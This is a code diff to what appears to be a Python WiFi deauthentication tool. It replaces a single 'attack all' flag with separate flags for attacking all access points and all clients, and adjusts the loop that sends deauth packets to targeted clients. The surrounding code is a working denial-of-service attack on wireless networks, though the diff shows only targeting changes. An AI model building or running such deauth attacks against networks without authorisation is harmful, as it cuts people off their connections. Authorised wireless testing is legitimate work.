@@ -32,7 +32,8 @@ parser.add_argument("--whitelist_ap", nargs='+', default=[], help="Ignore these 
 parser.add_argument("--whitelist_client", nargs='+', default=[], help="Ignore these clients from attacking.")
 parser.add_argument("--blacklist_ap", nargs='+', default=[], help="List of ESSID or BSSID AP targets.")
 parser.add_argument("--blacklist_client", nargs='+', default=[], help="List of client targets.")
-parser.add_argument("--attack_all", action='store_true', help="Allows to use empty blacklist lists and attacks all found, except for whitelist.")
+parser.add_argument("--attack_all_ap", action='store_true', help="Allows to use empty blacklist lists and attacks all found AP, except for whitelist.")
+parser.add_argument("--attack_all_client", action='store_true', help="Allows to use empty blacklist lists and attacks all found Clients, except for whitelist.")
 parser.add_argument("--channel_list", nargs='+', type=int, default=list(range(1, 14)) + list(range(36, 165, 4)), help="Channels to hop. Default includes all 2.4GHz and 5GHz channels.")
 parser.add_argument("--channel_wait", type=int, default=32, help="For how long to stay on a selected channel before hopping.")
 parser.add_argument("--scan_wait", type=int, default=10, help="For how long to scan")
@@ -161,13 +162,13 @@ def deauth_process() -> None:
                                 if (bssid in args.whitelist_ap) or (ssid in args.whitelist_ap):
                                     logger.info(f"AP SSID:{ssid} BSSID:{bssid} is in whitelist")
                                     continue
-                                if args.attack_all or (bssid.lower() in args.blacklist_ap or ssid in args.blacklist_ap):
+                                if args.attack_all_ap or (bssid.lower() in args.blacklist_ap or ssid in args.blacklist_ap):
                                     for client in client_list:
                                         logger.debug(f"Checking if Client:{client} should be deauthorized")
                                         if client in args.whitelist_client:
                                             logger.info(f"Client:{client} is in whitelist")
                                             continue
-                                        if args.attack_all or client in args.blacklist_client:
+                                        if args.attack_all_client or client in args.blacklist_client:
                                             logger.info(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
                                             executor.submit(send_deauth_packets, INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.deauth_reasons, seq=args.deauth_seq)
 
